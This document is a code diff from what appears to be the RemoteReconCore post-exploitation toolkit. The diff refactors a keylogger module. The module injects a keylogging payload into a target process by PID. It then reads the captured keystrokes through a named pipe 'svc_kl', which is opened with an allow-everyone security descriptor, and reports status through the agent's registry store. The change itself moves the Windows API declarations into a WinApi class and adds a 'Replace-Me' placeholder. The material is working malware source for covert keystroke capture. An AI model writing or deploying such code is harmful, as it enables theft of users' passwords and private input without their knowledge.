@@ -19,7 +19,7 @@ namespace RemoteReconCore
 
         public KeyValuePair<int, string> Run()
         {
-            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog");
+            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog", toReplace);
             Injector keylog = new Injector(targetPid, keylogMod);
             if (!keylog.Inject())
                 return new KeyValuePair<int, string>(2, "Failed to inject keylogger");
@@ -61,10 +61,10 @@ namespace RemoteReconCore
             try
             {
                 //Used PInvoke here instead of the IO.Pipes class because that class does not have a PeekNamedPipe method
-                IntPtr sa = CreateNullDescriptorPtr();
-                hPipe = CreateNamedPipe(@"\\.\pipe\svc_kl",
-                                               PIPE_ACCESS_INBOUND,
-                                               (PIPE_READMODE_BYTE | PIPE_WAIT),
+                IntPtr sa = WinApi.CreateNullDescriptorPtr();
+                hPipe = WinApi.CreateNamedPipe(@"\\.\pipe\svc_kl",
+                                               WinApi.PIPE_ACCESS_INBOUND,
+                                               (WinApi.PIPE_READMODE_BYTE | WinApi.PIPE_WAIT),
                                                1,
                                                0,
                                                1024,
@@ -74,7 +74,7 @@ namespace RemoteReconCore
                 Console.WriteLine("Waiting for client to connect");
 #endif
                 //Blocking call to wait for a client to connect
-                ConnectNamedPipe(hPipe, IntPtr.Zero);
+                WinApi.ConnectNamedPipe(hPipe, IntPtr.Zero);
             }
             catch (Exception e)
             {
@@ -96,7 +96,7 @@ namespace RemoteReconCore
                 Thread.Sleep(1000);
 
                 //Check to make sure the pipe is connected
-                if (ConnectNamedPipe(hPipe, IntPtr.Zero) == false && (uint)Marshal.GetLastWin32Error() != ERROR_PIPE_CONNECTED)
+                if (WinApi.ConnectNamedPipe(hPipe, IntPtr.Zero) == false && (uint)Marshal.GetLastWin32Error() != WinApi.ERROR_PIPE_CONNECTED)
                     break;
 
                 //Variables for PeekNamedPipe and ReadFile
@@ -111,10 +111,10 @@ namespace RemoteReconCore
                 try
                 {
                     //Check if there is data to read in the pipe
-                    if (!PeekNamedPipe(hPipe, null, 0, ref bytesRead, ref bytesAvail, ref bytesLeft) && bytesAvail == 0)
+                    if (!WinApi.PeekNamedPipe(hPipe, null, 0, ref bytesRead, ref bytesAvail, ref bytesLeft) && bytesAvail == 0)
                         continue;
                     //If we can't read for some reason, continue
-                    if (!ReadFile(hPipe, readBuff, (uint)readBuff.Length, ref read, IntPtr.Zero))
+                    if (!WinApi.ReadFile(hPipe, readBuff, (uint)readBuff.Length, ref read, IntPtr.Zero))
                         continue;
 
                     string ks = Encoding.UTF8.GetString(readBuff);
@@ -142,76 +142,14 @@ namespace RemoteReconCore
 #if DEBUG
             Console.WriteLine("Client disconnected");
 #endif
-            if (!DisconnectNamedPipe(hPipe))
+            if (!WinApi.DisconnectNamedPipe(hPipe))
                 Agent.rrbase.SetValue(Agent.modkey, Convert.ToBase64String(Encoding.ASCII.GetBytes("Unable to disconnect named pipe server")));
 
-            CloseHandle(hPipe);
+            WinApi.CloseHandle(hPipe);
             
         }
 
-        //Helper function to create a SECURITY_ATTRIBUTES structure with a allow everyone Security Descriptor
-        private static IntPtr CreateNullDescriptorPtr()
-        {
-            RawSecurityDescriptor gsd = new RawSecurityDescriptor(ControlFlags.DiscretionaryAclPresent, null, null, null, null);
-            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
-            sa.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
-            sa.bInheritHandle = 1;
-            byte[] desc = new byte[gsd.BinaryLength];
-            gsd.GetBinaryForm(desc, 0);
-            sa.lpSecurityDescriptor = Marshal.AllocHGlobal(desc.Length);
-            Marshal.Copy(desc, 0, sa.lpSecurityDescriptor, desc.Length);
-
-            IntPtr sec = Marshal.AllocHGlobal(Marshal.SizeOf(sa));
-            Marshal.StructureToPtr(sa, sec, true);
-
-            return sec;
-        }
-
-        //PInvoke Definitions
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr CreateNamedPipe(string Pipename,
-                                                      uint dwOpenMode,
-                                                      uint dwPipeMode,
-                                                      uint nMaxInstances,
-                                                      uint nOutBufferSize,
-                                                      uint nInBufferSize,
-                                                      uint nDefaultTimeout,
-                                                      IntPtr lpSecurityAttributes);
-
-
-        [DllImport("kernel32.dll", EntryPoint = "PeekNamedPipe", SetLastError = true)]
-        private static extern bool PeekNamedPipe(IntPtr handle,
-                                                 byte[] buffer, 
-                                                 uint nBufferSize, 
-                                                 ref uint bytesRead,
-                                                 ref uint bytesAvail, 
-                                                 ref uint BytesLeftThisMessage);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool ReadFile(IntPtr handle, byte[] buffer, uint toRead, ref uint read, IntPtr lpOverLapped);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool ConnectNamedPipe(IntPtr pHandle, IntPtr overlapped);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool DisconnectNamedPipe(IntPtr pHandle);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool CloseHandle(IntPtr hHandle);
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public IntPtr lpSecurityDescriptor;
-            public int bInheritHandle;
-        }
-
+        private string toReplace = "Replace-Me  ";
         private IntPtr hPipe;
-        private const uint INBOUND = 0x00000001;
-        private const uint PIPE_ACCESS_INBOUND = 0x00000001;
-        private const uint PIPE_READMODE_BYTE = 0x00000000;
-        private const uint PIPE_WAIT = 0x00000000;
-        private const ulong ERROR_PIPE_CONNECTED = 535;
     }
 }
